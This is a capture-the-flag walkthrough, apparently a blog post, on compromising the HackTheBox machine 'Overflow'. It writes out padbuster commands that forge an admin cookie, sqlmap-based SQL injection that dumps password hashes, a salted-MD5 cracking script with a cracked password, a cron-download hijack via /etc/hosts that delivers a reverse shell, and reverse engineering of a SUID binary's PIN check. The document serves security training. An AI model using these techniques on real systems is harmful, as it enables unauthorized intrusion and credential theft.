<h4 id="nmap">NMAP</h4>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Thu Feb  3 03:04:42 2022 as: nmap -sC -sV -o nmap.txt -v overflow.htb
Nmap scan report for overflow.htb (10.10.11.119)
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=overflow
| Subject Alternative Name: DNS:overflow
| Issuer: commonName=overflow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-17T10:41:37
| Not valid after:  2031-05-15T10:41:37
| MD5:   9bec 0c24 e822 f27b 0e0b be7a 1e42 90ca
|_SHA-1: 4423 a65c ca82 e166 4a7e 1416 d759 111b 36b3 e532
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 03:05:45 2022 -- 1 IP address (1 host up) scanned in 62.96 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/20220216103658.png" alt="" /></p>

<p>There is a contact form at the bottom of the page;</p>

<p><img src="/assets/img/20220216104043.png" alt="" /></p>

<p>Filling and submitting the form generated a GET request to the site’s homepage without any of the parameters, so this is probably just another broken form as commonly seen in HTB boxes.</p>

<p>There is a login page linked at the top of the homepage;</p>

<p><img src="/assets/img/20220216104151.png" alt="" /></p>

<p>This is submitted in a simple POST request with no tokens;</p>

<p><img src="/assets/img/20220216104422.png" alt="" /></p>

<p>Using the registration page, I was able to create an account and login to the site;</p>

<p><img src="/assets/img/20220216104706.png" alt="" /></p>

<p><img src="/assets/img/20220216104830.png" alt="" /></p>

<p>There is nothing of much interest in the site even after login. The <em>blog</em> page linked to from the homepage after login has a few entries, but only the title seems valid. All the links are dead. The titles are: <em>Outdated Softwares</em>, <em>Buffer Overflows</em>, <em>Insecure File Uploads</em>, and <em>SQL Truncation Attacks</em>. This feels like a teaser for what’s about to come.</p>

<p>Looking more closely at the homepage, I noticed a possible username <strong>ajmal</strong>;</p>

<p><img src="/assets/img/20220216110013.png" alt="" /></p>

<p>I tested if this username existed in the website, and it didn’t because I was able to create an account with it. However, the user <strong>admin</strong> may exist in the server because I was unable to register an account with it.</p>

<p>Fuzzing the site for hidden subdomains didn’t yield any;</p>

<p><img src="/assets/img/20220216114327.png" alt="" /></p>

<p><br /></p>

<h4 id="smtp">SMTP</h4>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">nmap</code> scan on the host showed that SMTP is running on port <strong>25</strong>, and that the <code class="language-plaintext highlighter-rouge">vrfy</code> command is available, which could be used to enumerate valid users. The command showed that the user <code class="language-plaintext highlighter-rouge">root</code> exists on the host;</p>

<p><img src="/assets/img/20220216111316.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code>, the following users were enumerated;</p>
<ul>
  <li>www-data</li>
  <li>root</li>
  <li>postfix</li>
  <li>daemon</li>
  <li>MAILER-DAEMON</li>
  <li>list</li>
  <li>news</li>
  <li>nobody</li>
  <li>mail</li>
  <li>postmaster.</li>
</ul>

<p>These are all default user accounts, so nothing interesting.</p>

<p>Using <code class="language-plaintext highlighter-rouge">netcat</code>, I was able to send an email to the root user without any issues;</p>

<p><img src="/assets/img/20220216112314.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="oracle-padding">Oracle Padding</h3>
<p><br /></p>

<p>I was convinced the titles of the blog entries are some sort of hints for solving this box. The only one that applies to the website at this stage is the <em>SQL Truncation attack</em>, so I decided to probe the account registration and login functions, since they are the only ways that let me send some data that is actually processed by the web application.</p>

<p>Fuzzing the login parameters <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> for SQL-related attacks didn’t give me anything. However, the session cookie <code class="language-plaintext highlighter-rouge">auth</code> that is issued after authentication looks interesting because it looks like a URL encoded base64 string;</p>

<p><img src="/assets/img/20220217162110.png" alt="" /></p>

<p>URL-decoding and base64-decoding this, I get some string that appears to be encrypted. So I started fuzzing it manually through burp’s repeater.</p>

<p>When adding a single character to the end of the cookie string, which could be anything, I was able to access the <code class="language-plaintext highlighter-rouge">/home/profile/</code> page which is protected by authentication. If I add more than one character at the end of the cookie, I get a <strong>302</strong> redirect to the login page with the parameter <code class="language-plaintext highlighter-rouge">err=1</code>;</p>

<p><img src="/assets/img/20220217163117.png" alt="" /></p>

<p>Going to the URL, I got an interesting message;</p>

<p><img src="/assets/img/20220217163349.png" alt="" /></p>

<p>It was at this point that I actually realised the web application is vulnerable to <em>Execute After Redirect (EAR)</em> vulnerability because the page is actually returned when making a request without the session cookie;</p>

<p><img src="/assets/img/20220217164012.png" alt="" /></p>

<p>Going back to the cookie, I noticed that adding anything to the begining of the cookie result in an error, with exception of few characters like <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">"</code>, or <code class="language-plaintext highlighter-rouge">+</code>.</p>

<p>I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, but it couldn’t find anything. Testing for SQL truncation attack in the registration function with the aim of creating another account with the username <strong>admin</strong> (which seems to be already registered) didn’t work.</p>

<p>I continue to fuzz the website for hidden paths in hope of finding one I can access due to the EAR flaw. Fuzzing the web root, I found the directory <strong>config</strong>;</p>

<p><img src="/assets/img/20220218055109.png" alt="" /></p>

<p>Fuzzing that directory, I got a few hits;</p>

<p><img src="/assets/img/20220218055219.png" alt="" /></p>

<p>All are just PHP pages, and didn’t give me anything. Bruteforcing the <code class="language-plaintext highlighter-rouge">/home</code> page found a new path <code class="language-plaintext highlighter-rouge">/home/logs.php</code>;</p>

<p><img src="/assets/img/20220218060331.png" alt="" /></p>

<p>Going to the page, I got an <strong>Unauthorized</strong> message. I get this <em>unauthorized</em> message even after logging in with my test account, so this page is probably only accessible by the <strong>admin</strong>.</p>

<p>I was stuck on this for a while, and had to take a sanity check regarding the padding error I was getting when playing with the <code class="language-plaintext highlighter-rouge">auth</code> cookie. I was introduced to <em>Oracle Padding</em> attacks, which is something I’ve never heard before :(</p>

<p>After reading up on such attacks at https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html and some other sites, I was able to decode the cookie issued to my test account using a tool called <code class="language-plaintext highlighter-rouge">padbuster</code> that automate this process.</p>

<p>To use <code class="language-plaintext highlighter-rouge">padbuster</code>, you need to at least supply the target URL, the encrypted string, and the block size. The url in this case is any page that process the cookie, so I chose <code class="language-plaintext highlighter-rouge">/home/profile/</code>. The encrypted string is the cookie value I got after login, and the block size is <strong>8</strong> since the base64-decoded cookie always gives 24 characters, which is a multiple of <strong>8</strong>.</p>

<p>With this info, I was able to decrypt the cookie I was issued using the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>padbuster http://overflow.htb/home/profile/ 6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9 8 <span class="nt">-cookies</span> <span class="s2">"auth=6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It took quite a while, but it worked;</p>

<p><img src="/assets/img/20220218130956.png" alt="" /></p>

<p>Using the command, I was able to craft a cookie with <code class="language-plaintext highlighter-rouge">user=admin</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>padbuster http://overflow.htb/home/profile/ RhNgaMySdgdBgb3N7iuvOM25sELhCZ72 8 <span class="nt">-cookies</span> <span class="s2">"auth=RhNgaMySdgdBgb3N7iuvOM25sELhCZ72"</span> <span class="nt">-plaintext</span> <span class="s2">"user=admin"</span> <span class="nt">-verbose</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220219081330.png" alt="" /></p>

<p>Loading the homepage using this cookie, I noticed two new links in the homepage;</p>

<p><img src="/assets/img/20220219081749.png" alt="" /></p>

<p>Clicking on <code class="language-plaintext highlighter-rouge">Logs</code> just gave me a little popup;</p>

<p><img src="/assets/img/20220219081834.png" alt="" /></p>

<p>Clicking the <code class="language-plaintext highlighter-rouge">Admin panel</code>, I was presented with a login form;</p>

<p><img src="/assets/img/20220219082100.png" alt="" /></p>

<p>Trying some common defaults for the login didn’t work. Checking burp to see how the <code class="language-plaintext highlighter-rouge">/home/logs.php</code> works, I noticed that it passes a GET parameter <code class="language-plaintext highlighter-rouge">name</code> with the value set to <code class="language-plaintext highlighter-rouge">admin</code>. Adding a single quote to test for <em>SQL Injection</em> gave a <strong>500 Internal Server Error</strong>. So I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, and it turns out to be vulnerable;</p>

<p><img src="/assets/img/20220219084125.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="sql-injection">SQL Injection</h3>
<p><br /></p>

<p>Available databases;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>[*] cmsmsdb
[*] information_schema
[*] logs
[*] Overflow
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Tables for <code class="language-plaintext highlighter-rouge">cmsmsdb</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>Database: cmsmsdb
[47 tables]
+-----------------------------+
| cms_additional_users        |
---[snip]---
| cms_user_groups             |
| cms_userplugins             |
| cms_userplugins_seq         |
| cms_userprefs               |
| cms_users                   |
| cms_users_seq               |
| cms_version                 |
+-----------------------------+
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The table <code class="language-plaintext highlighter-rouge">cms_users</code> contains two hashes;</p>

<table>
  <thead>
    <tr>
      <th>EMAIL</th>
      <th>USERNAME</th>
      <th>PASSWORD</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>admin@overflow.htb</td>
      <td>admin</td>
      <td>c6c6b9310e0e6f3eb3ffeb2baff12fdd</td>
    </tr>
    <tr>
      <td> </td>
      <td>editor</td>
      <td>e3d748d58b58657bfa4dffe2def0b1c7</td>
    </tr>
  </tbody>
</table>

<p>Feeding these 2 hashes to <code class="language-plaintext highlighter-rouge">john</code>, I was unable to crack any using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>. This is probably just a rabbit hole, or the hashes could be salted. So I tried using the <code class="language-plaintext highlighter-rouge">--file-read</code> flag of <code class="language-plaintext highlighter-rouge">sqlmap</code> to see if I can read local files, and I couldn’t.</p>

<p>I dumped the whole database using <code class="language-plaintext highlighter-rouge">sqlmap</code> and start going through the records locally in hope of finding something. Searching for the domain name in the records dumped by <code class="language-plaintext highlighter-rouge">sqlmap</code>, I found one;</p>

<p><img src="/assets/img/20220219114511.png" alt="" /></p>

<p>Going to the page, I got another login form;</p>

<p><img src="/assets/img/20220219114720.png" alt="" /></p>

<p>After a lot of digging, I found a hex-encoded string that could be a salt in the table <code class="language-plaintext highlighter-rouge">cms_siteprefs</code>(<em>mask</em> is another name for a salt);</p>

<p><img src="/assets/img/20220219115141.png" alt="" /></p>

<p>I was unable to get <code class="language-plaintext highlighter-rouge">john</code> to work with the hash, so I wrote a simple script;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>


<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Usage: %s &lt;hash&gt; &lt;salt&gt; &lt;wordlist&gt;"</span> <span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">wordlist</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">wordlist</span><span class="p">):</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Invalid wordlist: "</span> <span class="o">+</span> <span class="n">wordlist</span><span class="p">)</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[*] Bruteforcing hash..."</span><span class="p">);</span>
<span class="nb">hash</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">salt</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="n">word</span> <span class="o">=</span> <span class="n">wordlist</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="n">word</span><span class="p">:</span> <span class="c1"># Wordlist exhausted.
</span>    <span class="k">break</span>
  <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
  <span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">salt</span> <span class="o">+</span> <span class="n">word</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="nb">hash</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Success: "</span> <span class="o">+</span> <span class="n">word</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[-] Unable to crack!"</span><span class="p">)</span>
<span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I saved the above as <code class="language-plaintext highlighter-rouge">md5-salt-brute.py</code>, and ran it. I was able to crack the hash of the user <strong>editor</strong>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span><span class="nb">cat </span>hashes.john    
admin:c6c6b9310e0e6f3eb3ffeb2baff12fdd   
editor:e3d748d58b58657bfa4dffe2def0b1c7
admin<span class="o">(</span>overflow<span class="o">)</span>:c71d60439ed5590b3c5e99d95ed48165
agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py c6c6b9310e0e6f3eb3ffeb2baff12fdd 6c2d17f37e226486 /wordlists/rockyou.txt                                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...                   
<span class="o">[</span>-] Unable to crack!                
agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py e3d748d58b58657bfa4dffe2def0b1c7 6c2d17f37e226486 /wordlists/rockyou.txt                                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...        
<span class="o">[</span>+] Success: alpha!@#<span class="nv">$%</span>bravo                 
agent47@debian:<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is the only hash I could crack, but it gave me access to <strong>devbuild-job.overflow.htb</strong>;</p>

<p><img src="/assets/img/20220219124740.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="devbuild-joboverflowhtb">devbuild-job.overflow.htb</h3>
<p><br /></p>

<p>Almost all the links in the dashboard are dead. The profile page has a form that allows users to upload a <em>resume</em>;</p>

<p><img src="/assets/img/20220223084146.png" alt="" /></p>

<p>Uploading a .png file, which is not part of the listed formats, gave a <strong>File Type Not supported</strong> error that appeared only briefly.</p>

<p>Playing with the request in burp’s repeater, I found out the web application may be depending on the file extension for validation, as changing the upload file name of a .png file succeeded, and showed what looks like an output of <code class="language-plaintext highlighter-rouge">exiftool</code>, along with the path the files are uploaded to;</p>

<p><img src="/assets/img/20220223085028.png" alt="" /></p>

<p>Exiftool has an RCE vulnerability tracked as <strong>CVE-2021-22204</strong>, and there is a PoC in the GitHub repo https://github.com/convisolabs/CVE-2021-22204-exiftool. Using it, I was able to spawn a shell on the box as <strong>www-data</strong>;</p>

<p><img src="/assets/img/20220223085941.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Inside the box as <strong>www-data</strong>, I found two local users; <strong>developer</strong>, and <strong>tester</strong>. The user <strong>tester</strong> is the one that hold the user flag. The configuration files of the site <strong>devbuild-job.overflow.htb</strong> has a MySQL credential;</p>

<p><img src="/assets/img/20220223090438.png" alt="" /></p>

<p>The password is not reused by any of the local users. The main site <strong>overflow.htb</strong> also has a MySQL credential;</p>

<p><img src="/assets/img/20220223090806.png" alt="" /></p>

<p>Testing this password against the local user account of <strong>developer</strong> worked, and I was able to login over SSH;</p>

<p><img src="/assets/img/20220223091047.png" alt="" /></p>

<p><br /></p>

<h4 id="developer">Developer</h4>
<p><br /></p>

<p>The user does not have any <code class="language-plaintext highlighter-rouge">sudo</code> permissions, but they belong to a group called <strong>network</strong>. Searching for files that belong to this group, I got one very interesting match;</p>

<p><img src="/assets/img/20220223092838.png" alt="" /></p>

<p>I have write permissions on a very important file. If I can find any service that’s making some requests to a hostname, I can edit the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so that the hostname resolves to an address I control.</p>

<p>So I uploaded <code class="language-plaintext highlighter-rouge">pspy</code> to the box, and it picked up a download using <code class="language-plaintext highlighter-rouge">curl</code> for a shell script on the site <strong>taskmanage.overflow.htb</strong>;</p>

<p><img src="/assets/img/20220223094110.png" alt="" /></p>

<p>So I created a file named <code class="language-plaintext highlighter-rouge">task.sh</code> with a reverse shell payload on my box, and hosted it using python’s <code class="language-plaintext highlighter-rouge">http.server</code> module. I then edited the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file on the box and mapped the domain <strong>taskmanage.overflow.htb</strong> to my IP;</p>

<p><img src="/assets/img/20220223094534.png" alt="" /></p>

<p>After a few seconds, the file was downloaded from my attack box, and executed, which gave me access to the box as <strong>tester</strong>;</p>

<p><img src="/assets/img/20220223094835.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>I cannot view <code class="language-plaintext highlighter-rouge">sudo</code> permission for the user <strong>tester</strong> as I still don’t have their password, and the user does not belong to any other group.</p>

<p>Going through the filesystem, I found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt</code>;</p>

<p><img src="/assets/img/20220223095648.png" alt="" /></p>

<p>Running the binary, I was prompted for a PIN;</p>

<p><img src="/assets/img/20220223095808.png" alt="" /></p>

<p>So I shipped the binary to my attack box for analysis.</p>

<p><br /></p>

<h4 id="analysis-file_encrypt">Analysis: file_encrypt</h4>
<p><br /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span>rabin2 <span class="nt">-I</span> file_encrypt 
<span class="nb">arch     </span>x86
baddr    0x0
binsz    10741
bintype  elf
bits     32
canary   <span class="nb">false
</span>class    ELF32
compiler GCC: <span class="o">(</span>Ubuntu 7.5.0-3ubuntu1~18.04<span class="o">)</span> 7.5.0
crypto   <span class="nb">false
</span>endian   little
havecode <span class="nb">true
</span>intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  <span class="nb">true
</span>lsyms    <span class="nb">true
</span>machine  Intel 80386
nx       <span class="nb">true
</span>os       linux
pic      <span class="nb">true
</span>relocs   <span class="nb">true
</span>relro    full
rpath    NONE
sanitize <span class="nb">false
</span>static   <span class="nb">false
</span>stripped <span class="nb">false
</span>subsys   linux
va       <span class="nb">true</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">main</code> function is calling <code class="language-plaintext highlighter-rouge">check_pin()</code>, which is likely the function doing PIN validation;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>[0x00000b62]&gt; pdf
╭ 46: int main (char **argv);
│           ; arg char **argv @ esp+0x14
│           0x00000b62      8d4c2404       lea ecx, [argv]
│           0x00000b66      83e4f0         and esp, 0xfffffff0
│           0x00000b69      ff71fc         push dword [ecx - 4]
│           0x00000b6c      55             push ebp
│           0x00000b6d      89e5           mov ebp, esp
│           0x00000b6f      51             push ecx
│           0x00000b70      83ec04         sub esp, 4
│           0x00000b73      e818000000     call sym.__x86.get_pc_thunk.ax
│           0x00000b78      0528240000     add eax, 0x2428
│           0x00000b7d      e82effffff     call sym.check_pin
│           0x00000b82      b800000000     mov eax, 0
│           0x00000b87      83c404         add esp, 4
│           0x00000b8a      59             pop ecx
│           0x00000b8b      5d             pop ebp
│           0x00000b8c      8d61fc         lea esp, [ecx - 4]
╰           0x00000b8f      c3             ret
[0x00000b62]&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Disassembly of <code class="language-plaintext highlighter-rouge">sym.check_pin</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre></td><td class="rouge-code"><pre>[0x56602ab0]&gt; pdf                                                                                                                     
            ; CALL XREF from main @ 0x56602b7d
╭ 178: sym.check_pin ();
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_14h @ ebp-0x14                                                                                          
│           ; var uint32_t var_10h @ ebp-0x10                                                                                         
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           0x56602ab0      55             push ebp
│           0x56602ab1      89e5           mov ebp, esp
│           0x56602ab3      53             push ebx
│           0x56602ab4      83ec24         sub esp, 0x24                                                                              
│           0x56602ab7      e864fcffff     call sym.__x86.get_pc_thunk.bx                                                             
│           0x56602abc      81c3e4240000   add ebx, 0x24e4
│           0x56602ac2      e8e9fbffff     call sym.imp.rand           ; int rand(void)                                               
│           0x56602ac7      8945f4         mov dword [ebp - 0xc], eax                                                                 
│           0x56602aca      83ec0c         sub esp, 0xc                                                                               
│           0x56602acd      ff75f4         push dword [ebp - 0xc]                                                                     
│           0x56602ad0      e848fdffff     call sym.random             ; uint32_t random(void)                                        
│           0x56602ad5      83c410         add esp, 0x10
│           0x56602ad8      8945f0         mov dword [ebp - 0x10], eax                                                                
│           0x56602adb      83ec08         sub esp, 8
│           0x56602ade      ff75f4         push dword [ebp - 0xc]
│           0x56602ae1      8d8358ddffff   lea eax, [ebx - 0x22a8]                                                                    
│           0x56602ae7      50             push eax                    ; const char *format                                           
│           0x56602ae8      e8f3faffff     call sym.imp.printf         ; int printf(const char *format)                               
│           0x56602aed      83c410         add esp, 0x10
│           0x56602af0      83ec08         sub esp, 8
│           0x56602af3      8d45ec         lea eax, [ebp - 0x14]
│           0x56602af6      50             push eax
│           0x56602af7      8d837dddffff   lea eax, [ebx - 0x2283]
│           0x56602afd      50             push eax                    ; const char *format
│           0x56602afe      e8bdfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x56602b03      83c410         add esp, 0x10
│           0x56602b06      8b45ec         mov eax, dword [ebp - 0x14]
│           0x56602b09      3945f0         cmp dword [ebp - 0x10], eax
│       ╭─&lt; 0x56602b0c      753c           jne 0x56602b4a
│       │   0x56602b0e      83ec0c         sub esp, 0xc
│       │   0x56602b11      8d8380ddffff   lea eax, [ebx - 0x2280]
│       │   0x56602b17      50             push eax                    ; const char *format
│       │   0x56602b18      e8c3faffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x56602b1d      83c410         add esp, 0x10
│       │   0x56602b20      83ec08         sub esp, 8
│       │   0x56602b23      8d45d8         lea eax, [ebp - 0x28]
│       │   0x56602b26      50             push eax
│       │   0x56602b27      8d83c3dcffff   lea eax, [ebx - 0x233d]
│       │   0x56602b2d      50             push eax                    ; const char *format
│       │   0x56602b2e      e88dfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│       │   0x56602b33      83c410         add esp, 0x10
│       │   0x56602b36      83ec0c         sub esp, 0xc
│       │   0x56602b39      8d8388ddffff   lea eax, [ebx - 0x2278]
│       │   0x56602b3f      50             push eax                    ; const char *s
│       │   0x56602b40      e8fbfaffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x56602b45      83c410         add esp, 0x10
│      ╭──&lt; 0x56602b48      eb12           jmp 0x56602b5c
│      ││   ; CODE XREF from sym.check_pin @ 0x56602b0c
│      │╰─&gt; 0x56602b4a      83ec0c         sub esp, 0xc
│      │    0x56602b4d      8d83e3ddffff   lea eax, [ebx - 0x221d]
│      │    0x56602b53      50             push eax                    ; const char *s
│      │    0x56602b54      e8e7faffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x56602b59      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.check_pin @ 0x56602b48
│      ╰──&gt; 0x56602b5c      90             nop
│           0x56602b5d      8b5dfc         mov ebx, dword [ebp - 4]
│           0x56602b60      c9             leave
╰           0x56602b61      c3             ret
[0x56602ab0]&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>There are multiple calls to <code class="language-plaintext highlighter-rouge">scanf()</code>, which is used to read input from the user. So I opened the binary in debug mode and set a breakpoint after the first call to <code class="language-plaintext highlighter-rouge">scanf()</code> at <code class="language-plaintext highlighter-rouge">0x56635b03</code>. The instruction at <code class="language-plaintext highlighter-rouge">0x56635b09</code> compares the value of <code class="language-plaintext highlighter-rouge">eax</code> (which is where the PIN we entered is stored), with the value in <code class="language-plaintext highlighter-rouge">var_10h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x10</code>);</p>

<p><img src="/assets/img/20220223104118.png" alt="" /></p>

<p>Since the comparison is with <code class="language-plaintext highlighter-rouge">eax</code>, which is a 32 bit register, I read 4 bytes from the other operand, which gave <code class="language-plaintext highlighter-rouge">0xf3e6d338</code>. Converting this to 32 bit signed integer, I got <code class="language-plaintext highlighter-rouge">-202976456</code>;</p>

<p><img src="/assets/img/20220223104835.png" alt="" /></p>

<p>This value is the valid PIN, and it was accepted by the binary;</p>

<p><img src="/assets/img/20220223105044.png" alt="" /></p>

<p>After that, we were prompted for a name, and the program printed out a message, and then exit. The way the program reads the <strong>name</strong> could be vulnerable to <em>buffer overflow</em>. The name read is stored at <code class="language-plaintext highlighter-rouge">var_28h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x28</code>);</p>

<p><img src="/assets/img/20220223111120.png" alt="" /></p>

